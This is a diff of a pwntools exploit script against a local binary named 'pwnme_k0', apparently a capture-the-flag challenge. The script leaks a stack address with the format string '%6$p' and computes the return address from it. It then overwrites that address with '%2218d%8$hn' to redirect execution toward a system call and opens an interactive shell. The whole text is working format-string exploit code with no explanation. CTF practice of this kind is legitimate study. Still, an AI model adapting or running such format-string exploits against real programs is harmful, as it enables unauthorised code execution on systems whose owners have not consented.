@@ -1,33 +1,26 @@
+#!/usr/bin/env python
 from pwn import *
-context.log_level="debug"
-context.arch="amd64"
+context.log_level = 'debug'
+context.arch = 'amd64'
 
-sh=process("./pwnme_k0")
-binary=ELF("pwnme_k0")
-#  gdb.attach(sh)
+p = process('./pwnme_k0')
+elf = ELF('pwnme_k0')
+# gdb.attach(p)
 
-sh.recv()
-sh.writeline("1"*8)
-sh.recv()
-sh.writeline("%6$p")
-sh.recv()
-sh.writeline("1")
-sh.recvuntil("0x")
-ret_addr = int(sh.recvline().strip(),16) - 0x38
-success("ret_addr:"+hex(ret_addr))
+p.sendlineafter('Input your username(max lenth:20):', 'AAAAAAAA')
+p.sendlineafter('Input your password(max lenth:20):', '%6$p')
+p.sendlineafter('>', '1')
+p.recvuntil('0x')
+val_addr = int(p.recvline().strip(), 16)
+ret_addr = val_addr - 0x38
+log.success('val_addr = ' + hex(val_addr))
+log.success('ret_addr = ' + hex(ret_addr))
 
+system_addr = 0x4008A6
+p.sendlineafter('>', '2')
+p.sendlineafter('please input new username(max lenth:20):', p64(ret_addr))
+p.sendlineafter('please input new password(max lenth:20):', '%2218d%8$hn')
 
-sh.recv()
-sh.writeline("2")
-sh.recv()
-sh.sendline(p64(ret_addr))
-sh.recv()
-#sh.writeline("%2214d%8$hn")
-#0x4008aa-0x4008a6
-sh.writeline("%2218d%8$hn")
-
-sh.recv()
-sh.writeline("1")
-sh.recv()
-sh.interactive()
-
+p.sendlineafter('>', '1')
+p.recv()
+p.interactive()
